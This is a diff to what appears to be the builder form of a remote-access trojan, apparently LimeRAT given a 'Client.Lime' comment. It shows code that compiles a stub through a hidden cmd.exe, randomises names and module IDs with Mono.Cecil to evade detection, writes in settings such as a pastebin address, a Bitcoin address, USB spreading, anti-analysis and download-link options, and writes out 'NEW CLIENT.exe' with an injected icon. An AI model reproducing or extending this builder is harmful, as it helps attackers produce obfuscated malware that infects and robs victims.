@@ -1421,16 +1421,28 @@ Public Class Main
 
                 If radioNET2.Checked Then
                     If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe") Then
-                        Shell("C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & "", AppWinStyle.Hide, False, -1)
-                        Threading.Thread.Sleep(2000)
+                        Dim process As New Process()
+                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                        process.StartInfo.FileName = "cmd.exe"
+                        process.StartInfo.UseShellExecute = True
+                        process.StartInfo.CreateNoWindow = True
+                        process.StartInfo.Arguments = "/C C:\Windows\Microsoft.NET\Framework\v2.0.50727\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & ""
+                        process.Start()
+                        process.WaitForExit()
                     Else
                         MsgBox("Framework 2.0 is not installed!", MsgBoxStyle.Critical, Nothing)
                         Return
                     End If
                 Else
                     If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
-                        Shell("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & "", AppWinStyle.Hide, False, -1)
-                        Threading.Thread.Sleep(2000)
+                        Dim process As New Process()
+                        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                        process.StartInfo.FileName = "cmd.exe"
+                        process.StartInfo.UseShellExecute = True
+                        process.StartInfo.CreateNoWindow = True
+                        process.StartInfo.Arguments = "/C C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Misc\Stub\Stub.il""" & " /out=""" & Application.StartupPath + "\Misc\Stub\Stub.exe""" & ""
+                        process.Start()
+                        process.WaitForExit()
                     Else
                         MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical, Nothing)
                         Return
@@ -1469,13 +1481,15 @@ Public Class Main
                         definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(6, 20)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
                     End If
                     Dim definition2 As ModuleDefinition
-                        For Each definition2 In definition.Modules
+                    For Each definition2 In definition.Modules
                         If chkRename.Checked Then
+                            definition2.Mvid = Guid.NewGuid
+                            definition2.CustomAttributes.Clear()
                             definition2.Name = Randomi(rand.Next(5, 15))
                         End If
                         Dim definition3 As TypeDefinition
-                            For Each definition3 In definition2.Types
-                                If chkRename.Checked Then
+                        For Each definition3 In definition2.Types
+                            If chkRename.Checked Then
                                 ' If definition3.Namespace = "Client.Lime" Then
                                 definition3.Namespace = Randomi(rand.Next(5, 15))
                                 definition3.Name = Randomi(rand.Next(5, 15))
@@ -1484,79 +1498,79 @@ Public Class Main
                                     F.Name = Randomi(rand.Next(5, 15))
                                 Next
                             End If
-                                Dim definition4 As MethodDefinition
-                                For Each definition4 In definition3.Methods
-                                    If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
-                                        If chkRename.Checked Then
+                            Dim definition4 As MethodDefinition
+                            For Each definition4 In definition3.Methods
+                                If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
+                                    If chkRename.Checked Then
                                         definition4.Name = Randomi(rand.Next(5, 15))
                                         For Each P As ParameterDefinition In definition4.Parameters
                                             P.Name = Randomi(rand.Next(5, 15))
                                         Next
-                                        End If
-                                    ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
-                                        Dim enumerator As IEnumerator(Of Instruction)
-                                        Try
-                                            enumerator = definition4.Body.Instructions.GetEnumerator
-                                            Do While enumerator.MoveNext
-                                                Dim current As Instruction = enumerator.Current
-                                                If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
-                                                    Dim str As String = current.Operand.ToString
-                                                    If (str = "%Delay%") Then
-                                                        current.Operand = _numDelay.Value.ToString
-                                                    End If
-                                                    If (str = "%Pastebin%") Then
-                                                        current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
-                                                    End If
-                                                    If (str = "%EXE%") Then
-                                                        current.Operand = _exe.Text
-                                                    End If
-                                                    If (str = "%SPL%") Then
-                                                        current.Operand = S_Settings.SPL
-                                                    End If
-                                                    If (str = "%KEY%") Then
-                                                        current.Operand = S_Settings.KEY
-                                                    End If
-                                                    If (str = "%PASS%") Then
-                                                        current.Operand = S_Settings.EncryptionKey
-                                                    End If
-                                                    If (str = "%DROP%") Then
-                                                        current.Operand = _drop.Checked.ToString
-                                                    End If
-                                                    If (str = "%PATH1%") Then
-                                                        current.Operand = _path1.Text
-                                                    End If
-                                                    If (str = "%PATH2%") Then
-                                                        current.Operand = _path2.Text
-                                                    End If
-                                                    If (str = "%BTC_ADDR%") Then
-                                                        current.Operand = _btc.Text
-                                                    End If
-                                                    If (str = "%USB%") Then
-                                                        current.Operand = _usb.Checked.ToString
-                                                    End If
-                                                    If (str = "%PIN%") Then
-                                                        current.Operand = _pin.Checked.ToString
-                                                    End If
-                                                    If (str = "%ANTI%") Then
-                                                        current.Operand = _anti.Checked.ToString
-                                                    End If
-                                                    If (str = "%DWN_CHK%") Then
-                                                        current.Operand = _dwnchk.Checked.ToString
-                                                    End If
-                                                    If (str = "%DWN_LINK%") Then
-                                                        current.Operand = _dwnlink.Text
-                                                    End If
-                                                End If
-                                            Loop
-                                        Finally
-                                        End Try
-
                                     End If
-                                Next
+                                ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
+                                    Dim enumerator As IEnumerator(Of Instruction)
+                                    Try
+                                        enumerator = definition4.Body.Instructions.GetEnumerator
+                                        Do While enumerator.MoveNext
+                                            Dim current As Instruction = enumerator.Current
+                                            If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
+                                                Dim str As String = current.Operand.ToString
+                                                If (str = "%Delay%") Then
+                                                    current.Operand = _numDelay.Value.ToString
+                                                End If
+                                                If (str = "%Pastebin%") Then
+                                                    current.Operand = S_Encryption.AES_Encrypt(_pastebin.Text)
+                                                End If
+                                                If (str = "%EXE%") Then
+                                                    current.Operand = _exe.Text
+                                                End If
+                                                If (str = "%SPL%") Then
+                                                    current.Operand = S_Settings.SPL
+                                                End If
+                                                If (str = "%KEY%") Then
+                                                    current.Operand = S_Settings.KEY
+                                                End If
+                                                If (str = "%PASS%") Then
+                                                    current.Operand = S_Settings.EncryptionKey
+                                                End If
+                                                If (str = "%DROP%") Then
+                                                    current.Operand = _drop.Checked.ToString
+                                                End If
+                                                If (str = "%PATH1%") Then
+                                                    current.Operand = _path1.Text
+                                                End If
+                                                If (str = "%PATH2%") Then
+                                                    current.Operand = _path2.Text
+                                                End If
+                                                If (str = "%BTC_ADDR%") Then
+                                                    current.Operand = _btc.Text
+                                                End If
+                                                If (str = "%USB%") Then
+                                                    current.Operand = _usb.Checked.ToString
+                                                End If
+                                                If (str = "%PIN%") Then
+                                                    current.Operand = _pin.Checked.ToString
+                                                End If
+                                                If (str = "%ANTI%") Then
+                                                    current.Operand = _anti.Checked.ToString
+                                                End If
+                                                If (str = "%DWN_CHK%") Then
+                                                    current.Operand = _dwnchk.Checked.ToString
+                                                End If
+                                                If (str = "%DWN_LINK%") Then
+                                                    current.Operand = _dwnlink.Text
+                                                End If
+                                            End If
+                                        Loop
+                                    Finally
+                                    End Try
+
+                                End If
                             Next
                         Next
+                    Next
 
-                        definition.Write(Application.StartupPath + "\" + "NEW CLIENT.exe")
+                    definition.Write(Application.StartupPath + "\" + "NEW CLIENT.exe")
                         If _icon.Checked = True AndAlso PictureBox1.ImageLocation <> "" Then
                             S_IconChanger.InjectIcon(Application.StartupPath + "\" + "NEW CLIENT.exe", PictureBox1.ImageLocation)
                         End If
